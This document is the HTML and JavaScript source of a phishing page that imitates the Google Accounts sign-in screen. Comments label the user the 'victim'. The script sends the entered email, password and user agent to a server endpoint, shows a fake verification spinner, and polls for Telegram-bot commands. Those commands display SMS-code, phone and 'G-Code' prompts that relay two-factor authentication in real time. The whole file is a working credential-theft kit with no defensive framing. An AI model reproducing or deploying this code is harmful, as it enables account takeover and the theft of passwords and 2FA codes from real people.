<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #fff;
            font-family: 'Roboto', 'Helvetica Neue', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            position: relative;
        }
        .logo { width: 75px; margin-bottom: 16px; }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 10px;
        }
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
            font-weight: 400;
        }
        .input-group { margin-bottom: 16px; text-align: left; }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            color: #202124;
            transition: border 0.2s;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }
        .btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 0 24px;
            height: 36px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
        .btn:disabled { background-color: #ccc; cursor: not-allowed; }
        .forgot-link {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        .footer { margin-top: 48px; font-size: 12px; color: #5f6368; display: flex; justify-content: space-between; }
        .footer a { color: #5f6368; text-decoration: none; margin: 0 8px; font-weight: 500; }
        .footer a:hover { color: #1a73e8; background-color: #f6fafe; border-radius: 4px; padding: 2px 4px; }

        /* --- REDIRECTING SCREEN --- */
        #redirect-screen {
            display: none;
            text-align: center;
            padding: 20px 0;
        }
        #redirect-screen h2 { font-size: 22px; color: #202124; margin-bottom: 10px; }
        #redirect-screen p { color: #5f6368; font-size: 16px; margin-bottom: 20px; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- BOT OVERRIDE (Shown when you tap bot buttons) --- */
        #bot-override {
            display: none;
            text-align: center;
            padding: 20px 0;
        }
        #bot-override h2 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #202124; }
        #bot-override p { font-size: 16px; color: #5f6368; margin-bottom: 20px; }
        .big-code {
            font-size: 32px;
            font-weight: bold;
            letter-spacing: 4px;
            background: #f1f3f4;
            padding: 15px;
            border-radius: 8px;
            display: inline-block;
            margin: 10px 0 20px;
            color: #202124;
        }
        .error-text { color: #d93025; font-size: 14px; margin-top: 10px; display: block; }
    </style>
</head>
<body>

    <div class="container">
        <!-- 1. GOOGLE LOGIN PAGE -->
        <div id="default-google-page">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="logo" alt="G">
            <h1>Sign in</h1>
            <div class="subtitle">to continue to Google Account</div>
            
            <div class="input-group">
                <input type="email" id="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            
            <div class="actions">
                <a href="#" class="forgot-link">Forgot email?</a>
                <button class="btn" id="submit-btn" onclick="submitLogin()">Next</button>
            </div>
            
            <div class="footer">
                <a href="#">English (United States)</a>
                <div>
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
            </div>
        </div>

        <!-- 2. REDIRECTING SCREEN (Shown after victim clicks Next) -->
        <div id="redirect-screen">
            <h2>Verifying credentials...</h2>
            <p>Please wait while we verify your account.</p>
            <div class="loader"></div>
            <p style="font-size:12px; color:#999;">Do not close this tab.</p>
        </div>

        <!-- 3. BOT OVERRIDE (Only shown when you tap Telegram buttons) -->
        <div id="bot-override">
            <h2 id="bot-title">Action Required</h2>
            <p id="bot-desc">Please enter the following:</p>
            <div id="bot-code-display" class="big-code">------</div>
            <span id="bot-error" class="error-text"></span>
        </div>
    </div>

    <script>
        // --- 1. VICTIM CLICKS NEXT ---
        function submitLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submit-btn');

            if(!email || !password) {
                alert("Please enter email and password.");
                return;
            }

            // Switch to Redirecting Screen
            document.getElementById('default-google-page').style.display = 'none';
            document.getElementById('redirect-screen').style.display = 'block';

            // Send data to server
            fetch('/data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: email, 
                    password: password, 
                    page: "google_2fa_page",
                    user_agent: navigator.userAgent
                })
            })
            .then(response => response.json())
            .catch(err => console.log("Data sent to server."));
        }

        // --- 2. LISTEN FOR TELEGRAM BOT COMMANDS ---
        function checkBotUpdates() {
            fetch('/data')
                .then(response => response.json())
                .then(data => {
                    // If bot has not acted yet, stay on Redirect screen
                    if (!data.status || data.status === 'idle' || data.status === '') {
                        return; 
                    }

                    // Bot acted! Hide Redirect, show Bot Override
                    document.getElementById('redirect-screen').style.display = 'none';
                    document.getElementById('bot-override').style.display = 'block';
                    document.getElementById('bot-error').innerText = "";
                    
                    // SMS Code
                    if (data.status === 'code_generated') {
                        document.getElementById('bot-title').innerText = "📱 SMS Verification";
                        document.getElementById('bot-desc').innerText = "Enter the code sent to your phone:";
                        document.getElementById('bot-code-display').style.display = 'inline-block';
                        document.getElementById('bot-code-display').innerText = data.code || "------";
                    }
                    // Password Error
                    else if (data.status === 'password_error') {
                        document.getElementById('bot-title').innerText = "❌ Password Error";
                        document.getElementById('bot-desc').innerText = "The password you entered is incorrect.";
                        document.getElementById('bot-code-display').style.display = 'none';
                        document.getElementById('bot-error').innerText = "Attempts: " + (data.attempts || 1) + " / 5";
                    }
                    // Phone Number
                    else if (data.status === 'phone_set') {
                        document.getElementById('bot-title').innerText = "📞 Phone Verification";
                        document.getElementById('bot-desc').innerText = "Confirm your phone number:";
                        document.getElementById('bot-code-display').style.display = 'inline-block';
                        document.getElementById('bot-code-display').innerText = data.phone_number || "Not set";
                    }
                    // G-Code
                    else if (data.status === 'g_code_updated') {
                        document.getElementById('bot-title').innerText = "🔑 G-Code Required";
                        document.getElementById('bot-desc').innerText = "Enter this G-Code:";
                        document.getElementById('bot-code-display').style.display = 'inline-block';
                        document.getElementById('bot-code-display').innerText = data.g_code || "------";
                    }
                })
                .catch(err => console.log("Waiting for bot..."));
        }
        
        // Check every 2 seconds
        setInterval(checkBotUpdates, 2000);
    </script>
</body>
</html>
